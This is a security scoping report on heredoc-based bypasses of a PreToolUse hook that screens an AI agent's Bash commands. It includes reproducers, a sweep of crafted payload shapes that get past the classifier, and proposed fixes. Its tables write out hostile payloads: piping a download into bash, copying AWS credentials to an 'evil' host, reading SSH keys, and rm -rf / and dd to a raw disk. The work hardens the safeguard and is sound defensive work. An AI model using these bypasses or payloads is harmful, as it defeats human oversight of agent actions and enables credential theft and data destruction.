# Threat model & scoping verdict — #1993 (heredoc classifier residual bypasses R5a/R5b)

Analysis-only scoping pass. Worktree under test:
`/Users/cody/workspace/lisa/.claude/worktrees/1993-heredoc-lexer-r5` @ `origin/main` = `b7b97f468`
— i.e. **after** #1994 (the five #1958 fixes) and **after** #2006/#1982 (content guards see through
substitution wrappers). No repo files were modified by this analysis.

Evidence artifacts (all under `/tmp/hd1993/`): `driver.py` (reproduction + guard backstop),
`driver2.py` (variants + patched prototype), `driver3.py` (399-shape sweep), `driver4.py`
(isolation), `overlay.py` (patched-tree builder), `patched-heredoc.py` (prototype fix),
`tree/` (symlink overlay used to run the real suite against the prototype).

Predecessor artifact: `.lisa/security-reverify5-1958.md` (round-5 VETO report; source of the R5a/R5b
definitions and their original reproducers). Untracked — never committed to
`feat/1958-heredoc-classifier-fps`.

---

## VERDICT

**Fix, but reframe the severity — and hard-stop the arms race after this round.**

The two open members are each a *provable*, *local* divergence from bash. A ~55-line prototype closes
them (plus a third member found during this pass) with **303/303 existing tests green and zero
over-block delta**. But the severity is **no longer CRITICAL** post-#1982: every one of these
mis-classifications lands on parser exit `10` (UNSUPPORTED), where the hook hands the **raw,
unmodified command** to the content guards. A wall miss therefore removes **zero** content-guard
coverage. Ship the fix as hygiene at WARNING severity, and ship it *together with* an explicit
accepted-limitation statement — never as "the wall is now sound."

---

## 1. Owner record — issue #1993

`gh issue view 1993 --repo CodySwannGT/lisa --comments` → **0 comments.** The entire owner record is
the issue body; the binding scope language is in the body itself:

> "#1958 was hard-bounded by the repo owner after five fix→re-attack rounds established the class is
> an open-ended bash-lexer emulation arms race. The decision: ship the five sound,
> independently-verified fixes (a strict improvement over `main`) and track the residual here rather
> than continue indefinitely."

> "**#1982 is the higher-leverage fix** and should be prioritized over further heredoc-lexer
> hardening."

> "All members are pre-existing (present on `main` before #1958) and require deliberately-crafted
> input — none is a shape an agent emits by accident."

Full body verbatim in §7. State: OPEN. Labels: none.

---

## 2. Threat Model (STRIDE)

| Threat | Applies? | Description | Mitigation |
|---|---|---|---|
| Spoofing | No | No identity surface in a PreToolUse text classifier. | — |
| Tampering | **Yes** | A crafted heredoc makes the classifier mis-model bash, so a `$(…)` the classifier calls inert is executed — arbitrary file/repo mutation. | Content guards still scan the raw text at exit 10; fixes A/B/C below. |
| Repudiation | No | Hook logs nothing either way. | — |
| Info Disclosure | **Yes** (unchanged by this bug) | `$(cat ~/.ssh/id_rsa …)` executes — but is equally allowed with no heredoc present. | Out of scope for this hook; not a regression. |
| Denial of Service | No | — | — |
| Elevation of Privilege | **No** | No privilege boundary is crossed. The agent already has shell. | — |

### Security Checklist

- [x] Input validation at system boundaries — the classifier *is* the boundary; it fails closed
      (exit 20) on 248/399 swept shapes today, 348/399 with the fix.
- [x] No secrets in code or logs — none added. `.gitleaksignore` (41 lines) carries no entry for
      these hooks and no secret-shaped literals exist in them.
- [x] Auth/authz enforced on new endpoints — N/A (local hook).
- [x] No SQL/NoSQL injection vectors — N/A.
- [x] No XSS vectors — N/A.
- [x] Dependencies free of known CVEs — no dependency change proposed.

---

## 3. Security (proven)

All rows: payloads assembled from bytes in Python (never on a shell command line — the analysis
session's own Bash calls pass through this very hook), driven JSON-on-stdin through the **real fanned
hook** `plugins/lisa/hooks/parity-safety-net.sh`, and executed under real `/bin/bash` with a
`@SENT@` sentinel.

### R5a — CONFIRMED — trailing `\` on the last body line swallows the terminator

**Where:** `plugins/src/base/hooks/parity-safety-net-heredoc.py`
- `marker_is_closed` **L708–715** (L713 `if candidate == marker.delimiter`)
- `unquoted_heredoc_body_has_substitution` **L549–575** (L561, same per-physical-line match)
- The comment at **L564–571** asserts *"the terminator was matched per physical line above (bash
  matches the delimiter before continuation processing), so continuations are joined only WITHIN the
  body window, never across the delimiter."* **That invariant is false for an unquoted delimiter.**

**Bash ground truth measured directly (no parser involved):**

| payload | stdout / stderr | meaning |
|---|---|---|
| `cat <<EOF ⏎ foo\ ⏎ EOF ⏎ bar` | stdout `b'fooEOF\nbar\n'` | `\<newline>` joined `foo`+`EOF`; here-doc never terminated; `bar` swallowed as body |
| `cat <<'EOF' ⏎ foo\ ⏎ EOF ⏎ bar` | stdout `b'foo\\\n'`, stderr `bar: command not found` | backslash is literal data; `EOF` terminates normally |

**So the per-physical-line rule is correct for QUOTED delimiters and wrong only for UNQUOTED ones.**
That asymmetry is what makes the fix local and provable rather than heuristic.

**Reproducers** (`⏎` = newline, `\` = one backslash):

| id | payload | bash -n | parser | hook | exec |
|---|---|---|---|---|---|
| R5a-X1 | `cat <<EOF⏎'foo\⏎EOF⏎$(touch @SENT@)⏎` | PASS | **10** | **ALLOWED(0)** | **True** |
| R5a-X1w | `cat <<EOF⏎'foo\⏎EOF⏎$(id > @SENT@)⏎` | PASS | **10** | **ALLOWED(0)** | **True** |
| R5a-bt | ``cat <<EOF⏎'foo\⏎EOF⏎`touch @SENT@`⏎`` | PASS | **10** | **ALLOWED(0)** | **True** |

**Isolating controls (HELD):**

| id | payload | parser | hook |
|---|---|---|---|
| C1 (no apostrophe) | `cat <<EOF⏎foo\⏎EOF⏎$(touch)⏎` | 20 | BLOCKED |
| C3 (balanced apostrophes) | `cat <<EOF⏎'foo'\⏎EOF⏎$(touch)⏎` | 20 | BLOCKED |

**Impact (bounded):** arbitrary `$(…)`/backtick execution in the region bash swallows past the
apparent terminator, on a Bash tool call the hook approves. Requires a deliberately crafted
odd-apostrophe body **plus** a trailing backslash on the last body line.

**reason:** reproducer (sentinel created and `id` executed end-to-end through the real hook; C1/C3
pin the trigger) + bounded impact.

### R5b — CONFIRMED — an odd apostrophe in an unquoted body poisons the flat scanner past the terminator

**Where:**
- `has_active_command_substitution` **L416–457** runs ONE flat single/double-quote state machine over
  the whole command, including the here-doc body (L441–443 toggle `single` on `'`).
- `strip_provably_literal_body` **L694** bails on `not markers[0].quoted`, so an unquoted body is
  never neutralised.
- R3's separate body scanner `unquoted_heredoc_body_has_substitution` **L524–575** only walks lines
  *before* the terminator, so it never sees the post-terminator substitution either.

**Reproducers** (all `bash -n` PASS / parser **10** / hook **ALLOWED(0)** / sentinel **created**):

| id | payload |
|---|---|
| R5b-C2min | `cat <<EOF⏎'⏎EOF⏎$(touch @SENT@)⏎` |
| R5b-real | `cat <<EOF⏎it's fine⏎EOF⏎echo $(touch @SENT@)⏎` ← ordinary agent shape |
| R5b-full | `cat <<EOF⏎'foo⏎EOF⏎$(touch @SENT@)⏎` |
| R5b-bt | ``cat <<EOF⏎it's fine⏎EOF⏎`touch @SENT@`⏎`` |

**Poison-family map** (`driver4.py`) — the trigger is *precisely* an odd count of `'` in an unquoted
body, nothing else:

| body content | current parser |
|---|---|
| plain `body` | 20 BLOCKED |
| even `''` (`it's fine'`) | 20 BLOCKED |
| odd `"` (`say "hi`) | 20 BLOCKED |
| `#` alone (`# note`) | 20 BLOCKED |
| ANSI-C `$'a` | 20 BLOCKED |
| trailing `\` alone | 20 BLOCKED |
| **odd `'`** | **10 ALLOWED + EXECUTED** |
| **odd `'` + `#`** | **10 ALLOWED + EXECUTED** |
| **three `'`** | **10 ALLOWED + EXECUTED** |

**Scale:** in a 399-shape combinatorial sweep (`driver3.py`: 3 headers × 8 body-poisons × 2 tails ×
8 payload placements + 15 structural oddities), **114 shapes are ALLOWED-and-EXECUTED on current
main.** R5a/R5b are a broad family, not two payloads.

**Impact (bounded):** arbitrary `$(…)` on the command line following a `cat <<EOF` file write,
triggered by an ordinary English apostrophe.

**reason:** reproducer + bounded impact.

### R5c — CONFIRMED — NEW, found during this scoping pass: `<<\EOF` records no Marker

**Where:** `parse_marker` **L578–617**; the documented POSIX-divergence comment at **L597–607** says
`<<\EOF` is invisible to the parser — *"no Marker is recorded and the body stays raw-visible to every
guard."* That rationale covers the body's own contents, but **not** the body's ability to corrupt the
flat scanner's quote state for text *after* the terminator.

**Reproducer:** `cat <<\EOF⏎it's⏎EOF⏎$(touch @SENT@)⏎` → parser **10**, hook **ALLOWED**, sentinel
**created**. Without the apostrophe the same shape is BLOCKED (20) — pinning the trigger.

**Bash ground truth:** `cat <<\EOF` body is fully literal (`stdout = b"it's $(echo RAN)\n"`), i.e.
bash/POSIX treat `\EOF` as a **quoted** delimiter. That is what makes the fix principled.

**It survives the R5a+R5b prototype**, because that prototype's neutraliser is gated on
`len(markers) == 1` and no marker is recorded for this spelling.

**Impact (bounded):** identical to R5b, on a delimiter spelling the parser does not model.

**reason:** reproducer + bounded impact.

## Security (unproven)

- **Process substitution `<(…)`/`>(…)`** — the sweep flagged `cat <(echo hi)⏎$(touch X)` as
  ALLOWED+EXECUTED, but that payload contains **no `<<` at all**: the parser short-circuits at
  **L720** (`if "<<" not in command`) and returns SAFE with the raw command handed to the guards.
  This is not a here-doc-wall bypass; it is the safety net's normal posture for a non-heredoc
  command.
  - reproducer: `/tmp/hd1993/driver3.py` row `procsub`
  - impact: **unproven** — no wall regression; identical to the documented baseline
  - reason: reproducer exists, but the impact half is absent — it is the baseline, not a defect.
    No action.

---

## 4. What a wall miss actually costs now that #1982 shipped — the severity reframe

This is the most important finding, and it is empirical.

**(a) R5a/R5b/R5c all land on exit `10` (UNSUPPORTED), never `0` (SAFE).**
At `10`, `parity-safety-net.sh` **L148** sets `command_for_guards="$command_str"` — the *raw,
unmodified* command, here-doc body and all. **A wall miss therefore removes exactly zero
content-guard coverage.** Only exit `0` strips payload text, and exit `0` requires the narrow
`gh issue|pr create/edit/comment` + `<<'EOF'` grammar (`classify_safe`, L212–248), which none of
these reach.

**(b) Every guard-covered destructive payload smuggled through the wall is still BLOCKED**
(measured through the real hook, for both the R5a and the R5b wall miss, and for R5c):

| payload placed after the wall miss | hook | block reason |
|---|---|---|
| `$(rm -rf /)` | **BLOCKED** | recursive forced delete of a root, home, or wildcard path |
| `$(rm -rf ~/)` | **BLOCKED** | root/home/wildcard |
| `$(rm -rf *)` | **BLOCKED** | top-level wildcard |
| `$(rm -rf /etc/foo)` | **BLOCKED** | absolute path outside the project |
| `$(psql -c "DROP TABLE users")` | **BLOCKED** | destructive SQL (DROP/TRUNCATE) |
| `$(dd if=/dev/zero of=/dev/disk0)` | **BLOCKED** | dd writing to a raw device |

**(c) What still gets through is identical to the no-heredoc baseline.**

| payload | with R5b wall miss | with NO heredoc at all |
|---|---|---|
| `$(curl -s http://e.example/x \| bash)` | ALLOWED | `echo "$(curl … \| bash)"` → **ALLOWED** |
| `$(echo … \| base64 -d \| sh)` | ALLOWED | ALLOWED |
| `$(chmod -R 777 /)` | ALLOWED | ALLOWED |
| `$(scp ~/.aws/credentials evil:/tmp)` | ALLOWED | ALLOWED |

The safety net is a destructive-**operation** guard, not an execution wall; an adversary who wants
arbitrary execution simply omits the here-doc.

**Conclusion:** post-#1982 the marginal capability R5a/R5b/R5c grant an attacker over what they
already have is **zero** for every class the safety net is designed to stop, and **no greater than
baseline** for everything else. The #1958 RV5 report's CRITICAL rating was explicitly conditioned on
the guard blindness that #1982/#2006 has since removed — its own WARNING (RV5 lines 158–160) says so.
**Severity now: WARNING / defence-in-depth-contained, not CRITICAL.**

---

## 5. Bounded vs unbounded — and the smallest correct fix

**One root cause explains all three members:** *the flat cross-line quote/comment state machine
applies shell quote semantics to bytes inside a here-doc body, where bash applies none; and the
terminator is matched per physical line, where bash matches it after `\<newline>` removal.* Both
halves are invariants about bash verified directly above, not heuristics.

| member | smallest correct fix | rating |
|---|---|---|
| **R5a** | New `body_terminator_found(command, marker)`: for `not marker.quoted`, run `collapse_body_continuations` over the post-marker text **before** matching the delimiter. Make `marker_is_closed` (L708) delegate to it. Quoted delimiters keep the per-physical-line match — proven correct by ground truth. | **BOUNDED** |
| **R5b** | New `neutralize_heredoc_bodies(command, markers)`: blank the body window (spaces; newlines preserved) before the flat `has_active_command_substitution` call at **L754–756**. In-body substitutions remain covered by `unquoted_heredoc_body_has_substitution`; quoted bodies are genuinely inert. | **BOUNDED** |
| **R5c** | Record `<<\DELIM` as `Marker(quoted=True)` in `parse_marker` (bash-correct per ground truth) so B's neutraliser applies — or extend the neutraliser to the zero-marker backslash-delimiter case. Also removes the current inconsistency where `<<\EOF` + a plain body over-blocks at 20. | **BOUNDED** |

### Prototype evidence

`/tmp/hd1993/patched-heredoc.py` — fixes A+B only, ~55 added lines:

- **Sweep: 114 → 2** executed bypasses out of 399. The 2 residuals are R5c and the
  process-substitution non-finding.
- **Full existing suite**, run from a symlink overlay (`/tmp/hd1993/tree`) with the patched parser
  fanned to all 5 plugin copies:
  `Test Files 5 passed (5) / Tests 303 passed (303)` — **identical to baseline**
  (`parity-safety-net-heredoc`, `-literal`, `-continuation`, `-guards`, `parity-safety-net`).
- **Zero over-block delta:** `OB-apostrophe-prose`, `OB-trailing-bs-mid`, `OB-quoted-literal`,
  `OB-tabs`, `OB-home-var`, `OB-apos-then-plain-cmd`, `OB-gh-writer` all classify exactly as before.
- **No regression on prior rounds:** Finding-1, R3-inline, R3-hash, R4-split all still 20/BLOCKED.

### The caveat that must not be lost

R5c — a *new* member of the same class — was found within one session, purely by sweeping. That is
round 6 of an arms race the owner already hard-bounded at round 5. **Each individual fix is bounded;
the class is not.**

---

## 6. Recommendations

### FIX NOW — priority: **warning** (not critical)

Apply fixes A + B + C as one change. Justification: each is a provable divergence with a local patch;
the prototype is empirically clean (303/303, zero over-block, 114→0 in-family); and leaving 114
sweep-reachable executed bypasses in a shipped guard is poor hygiene even at defence-in-depth
severity. Do **not** describe the result as "the RCE is fixed."

Mechanics:

- Edit **`plugins/src/base/hooks/parity-safety-net-heredoc.py` only** — the other 4 copies
  (`plugins/lisa`, `lisa-agy`, `lisa-cursor`, `lisa-copilot`) are generated.
- In the **same commit**: `bun run build:plugins` (fan-out), `bun run check:plugins` (sync gate), and
  `bun run build:upstream-evidence-manifest` — CI fails "manifest is stale" without the last one.
- Fixtures: R5a rows into `tests/unit/hooks/parity-safety-net-heredoc-continuation.test.ts` (its
  module docstring already owns the continuation story); a new
  `parity-safety-net-heredoc-body-quote-state.test.ts` for R5b/R5c. Carry the isolating controls
  C1/C3/C2dq **plus the whole poison-family table from §3** — the "even `''` / odd `\"` / `#` alone
  do NOT bypass" rows are what pin the root cause and stop a future fix from over-generalising.
- Re-run all four drivers against the fixed hook before closing; `/tmp/hd1993/driver3.py` is the
  regression sweep.

Implementation note: the issue's own "Fix direction" §(2) says to map `'`/`"`/`#` to inert bytes
*while preserving* `$(`/backtick inside the body window. The prototype instead **blanks the window
entirely** and relies on the existing `unquoted_heredoc_body_has_substitution` (L524–575) for in-body
detection — simpler, smaller diff, and empirically equivalent (R3-inline, R3-hash, R4-split all stay
BLOCKED). Either is acceptable.

### HARD STOP — document as accepted limitation

State explicitly that this is the final hardening round and that further members of the class are
accepted, not tracked. Three homes, each with a distinct reader:

1. **`parity-safety-net-heredoc.py` module docstring (L2).** The authoritative scope statement: this
   file is a *heuristic re-implementation* of bash's lexer, not an adversary-resistant control; its
   only hard guarantee is that the SAFE(0) strip path is narrow and provable; **every other path
   passes the raw command to the content guards**, so a mis-classification degrades to the guards,
   never to a bypass of them. Name R5a/R5b/R5c and #1993, and record the bash invariants (unquoted
   body = no quote processing, `\<newline>` removed *before* delimiter match; quoted and
   `\`-quoted delimiters = fully literal body, backslash is data) so any future round starts from the
   spec instead of re-deriving it.
2. **`parity-safety-net.sh` header**, adjacent to the existing "Known accepted false-positive class"
   paragraph (**L48–57**). Add the symmetric "known accepted *bypass* class" paragraph so an operator
   reading the hook sees both error directions and the #1982 backstop reasoning.
3. **`plugins/src/base/skills/lisa-parity-safety-net-rules/SKILL.md`.** It currently has **no**
   limitations or threat-model section at all (grep for limitation/bypass/threat/adversarial returns
   1 incidental hit at L190) — an operator reads "Built-in guards (always on)" and reasonably infers
   a wall. Add a short "What this does and does not defend against": it stops *accidental*
   catastrophic commands; it does not stop an adversarial agent, which has many uncovered paths
   regardless of here-docs.

**Not** a `.claude/rules/` entry. Rules are behavioural decrees for agents; this is a capability-scope
statement about a hook. Hook header + skill is the right home.

### On "document rather than chase"

Both, deliberately. The owner's hard-bound was a decision about *unbounded* chasing and it was right.
But the work in front of us is not chasing — it is a ~55-line patch already built and proven against
the full existing suite with zero over-block. Skipping it would leave 114 sweep-reachable executed
bypasses in place for no engineering saving. What **is** adopted from the owner's framing is the stop
condition: **after A+B+C ship, this class is closed as an accepted limitation, and the next member
found is documented, not fixed** — unless someone first demonstrates it defeats the *content guards*,
which is the layer that actually matters and the one #1982 correctly prioritised.

---

## 7. Issue #1993 body — verbatim

State: OPEN. Labels: none. **Comments: none (0).**

> ## Summary
>
> The safety-net heredoc classifier (`parity-safety-net-heredoc.py`) determines whether a heredoc payload is "provably literal" by re-implementing bash's quote/comment/heredoc/continuation lexing in Python. Any divergence between that Python model and real bash's lexing is a bypass: a command substitution the classifier believes is inert but bash actually expands. This is a **systematic class**, not a single bug — five distinct members were found and fixed in #1958 (PR forthcoming), and adversarial review then found two more (R5a, R5b) that remain open. The class is likely not fully closable by heuristic re-implementation.
>
> **All members are pre-existing** (present on `main` before #1958) and require **deliberately-crafted** input — none is a shape an agent emits by accident. The safety-net's primary role is catching *accidental* catastrophic commands; robust resistance to an adversary who knows bash's lexer is a different, much harder goal that a PreToolUse regex/heuristic hook cannot fully achieve (an adversarial agent has many other uncovered paths anyway).
>
> ## Fixed in #1958 (for reference)
> - Finding 1 — per-line quote-state reset (this was a regression introduced then reverted).
> - R1 — ANSI-C `$'…'` quoting desync.
> - R2 — `str.isspace()` / `str.splitlines()` Unicode-superset desync vs bash's ASCII blanks.
> - R3 — unquoted-heredoc-body quote/comment desync (a body apostrophe/`#` blinding the scanner).
> - R4 — line-continuation splitting a substitution token across body lines.
>
> ## Open residual (this issue)
>
> Two proven bypasses survive at #1958's HEAD, both confirmed executed end-to-end through the real hook under bash:
>
> - **R5a** — a trailing backslash on the last body line is a bash continuation that *swallows the terminator*, extending the real body past the line the classifier treats as the delimiter; a substitution placed after the apparent terminator then executes while the classifier scanned a shorter window. R4's window-extraction matches the delimiter per physical line, which is not what bash does when the delimiter line is continued.
> - **R5b** — an odd single-quote in an unquoted heredoc body opens a phantom quote in the flat substitution scanner that persists *past* the terminator, hiding a command-substitution on a following command line. No backslash needed. (Double-quote variant is already blocked; only the single-quote leak survives.)
>
> Both are the "write a note containing an apostrophe via `cat <<EOF`, then one more command" shape.
>
> ## Why these were not fixed in-line
>
> #1958 was hard-bounded by the repo owner after five fix→re-attack rounds established the class is an open-ended bash-lexer emulation arms race. The decision: ship the five sound, independently-verified fixes (a strict improvement over `main`) and track the residual here rather than continue indefinitely.
>
> ## The durable fix is elsewhere
>
> These wall bypasses are rated CRITICAL only because the **content guards** (rm/SQL/dd) are themselves blind to a destructive command wrapped in a substitution inside quotes — filed as #1982. If the content guards caught destructive payloads regardless of quoting/substitution, every heredoc-wall miss (including R5a/R5b) would degrade to defense-in-depth rather than an RCE. **#1982 is the higher-leverage fix** and should be prioritized over further heredoc-lexer hardening.
>
> ## Fix direction (if the wall itself is hardened later)
>
> Make the flat substitution scan heredoc-body-aware with ONE shared cross-line state machine used by both window-extraction and sub-detection: (1) remove `\<newline>` continuations *before* matching the delimiter so a swallowed terminator extends the window (R5a); (2) inside a body window, map `'`/`"`/`#` to inert bytes while preserving `$(`/backtick/`${`/`$((`, so the scanner neither leaks quote state past the terminator nor misses in-body substitutions (R5b). Reproducers and full analysis: `.lisa/security-reverify5-1958.md` in the #1958 branch.
>
> ## Non-blocking related residuals
> - #1982 — content guards miss command substitution nested in double quotes (the reason this class is CRITICAL).
> - Process-substitution `<(…)`/`>(…)` is not detected by the classifier (independently allowed with no heredoc present; defense-in-depth note).
